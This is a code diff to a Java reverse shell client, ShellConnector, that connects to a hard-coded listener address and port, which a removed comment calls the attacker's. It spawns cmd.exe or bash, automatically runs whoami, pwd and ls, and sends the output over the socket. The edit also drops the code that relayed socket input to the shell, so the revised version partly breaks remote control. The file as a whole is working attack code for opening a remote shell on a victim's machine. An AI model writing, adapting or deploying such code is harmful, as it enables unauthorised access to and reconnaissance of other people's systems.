@@ -1,18 +1,80 @@
 package NetworkShell;
 
-import java.io.InputStream;
-import java.io.OutputStream;
+import java.io.*;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.net.UnknownHostException;
 
-//connects to reverse shell within same network
-
 public class ShellConnector {
+
+    public static void Shell(Process process, Socket socket) throws Exception {
+        InputStream processInput = process.getInputStream();
+        OutputStream processOutput = process.getOutputStream();
+        OutputStream socketOutput = socket.getOutputStream();
+
+        byte[] buffer = new byte[1024];
+        int read;
+
+        Thread processToSocket = new Thread(() -> {
+            try {
+                while (!socket.isClosed()) {
+                    while (processInput.available() > 0) {
+                        int n = processInput.read(buffer);
+                        if (n > 0) {
+                            socketOutput.write(buffer, 0, n);
+                            socketOutput.flush();
+                            System.out.write(buffer, 0, n); 
+                            System.out.flush();
+                        }
+                    }
+                    Thread.sleep(50);
+                }
+            } catch (Exception ignored) {}
+        });
+        processToSocket.start();
+
+        BufferedReader consoleReader = new BufferedReader(new InputStreamReader(System.in));
+        String line;
+        while ((line = consoleReader.readLine()) != null) {
+            processOutput.write((line + "\n").getBytes());
+            processOutput.flush();
+        }
+
+        process.destroy();
+        socket.close();
+        System.out.println("Shell closed");
+    }
+
+    public static void autoDeploy(OutputStream socketOutput, String command) {
+        try {
+            String os = System.getProperty("os.name").toLowerCase();
+            ProcessBuilder pb = os.contains("win") ?
+                    new ProcessBuilder("cmd.exe", "/c", command) :
+                    new ProcessBuilder("/bin/bash", "-c", command);
+            pb.redirectErrorStream(true);
+            Process proc = pb.start();
+
+            InputStream in = proc.getInputStream();
+            byte[] buffer = new byte[1024];
+            int read;
+            while ((read = in.read(buffer)) != -1) {
+                socketOutput.write(buffer, 0, read);
+                System.out.write(buffer, 0, read);
+            }
+            socketOutput.flush();
+            System.out.flush();
+            proc.waitFor();
+        } catch (Exception e) {
+            try {
+                socketOutput.write(("Error running command " + command + ": " + e.getMessage() + "\n").getBytes());
+                socketOutput.flush();
+            } catch (Exception ignored) {}
+        }
+    }
 
     public static void main(String[] args) {
         boolean connectingToHost = true;
-        InetAddress myIp = null; // discover IP
+        InetAddress myIp = null;
 
         try {
             myIp = InetAddress.getLocalHost();
@@ -20,49 +82,26 @@ public class ShellConnector {
             throw new RuntimeException(e);
         }
 
-        String host = "192.168.1.92"; // Listener (attacker) IP
-        int port = 4444; // Listener port
+        String host = "192.168.1.92";
+        int port = 4444;
 
         System.out.println("Device IP: " + myIp);
         System.out.println("Attempting to connect to: " + host + ":" + port);
 
         while (connectingToHost) {
             try {
-
-                // Run cmd.exe
-                Process process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
+                String os = System.getProperty("os.name").toLowerCase();
+                Process process = os.contains("win") ?
+                        new ProcessBuilder("cmd.exe").redirectErrorStream(true).start() :
+                        new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
 
                 Socket socket = new Socket(host, port);
-
-                InputStream processInput = process.getInputStream();
-                OutputStream processOutput = process.getOutputStream();
-                InputStream socketInput = socket.getInputStream();
                 OutputStream socketOutput = socket.getOutputStream();
 
-                while (!socket.isClosed()) {
-                    while (processInput.available() > 0) {
-                        socketOutput.write(processInput.read());
-                    }
-
-                    while (socketInput.available() > 0) {
-                        processOutput.write(socketInput.read());
-                    }
-
-                    socketOutput.flush();
-                    processOutput.flush();
-
-                    try {
-                        process.exitValue();
-                        break;
-                    } catch (Exception ignored) {
-                    }
-
-                    Thread.sleep(50);
-                }
-
-                process.destroy();
-                socket.close();
-                System.out.println("Shell closed");
+                autoDeploy(socketOutput, "whoami");
+                autoDeploy(socketOutput, "pwd");
+                autoDeploy(socketOutput, "ls");
+                Shell(process, socket);
 
             } catch (Exception e) {
                 System.err.println("Reverse shell error: " + e.getMessage());
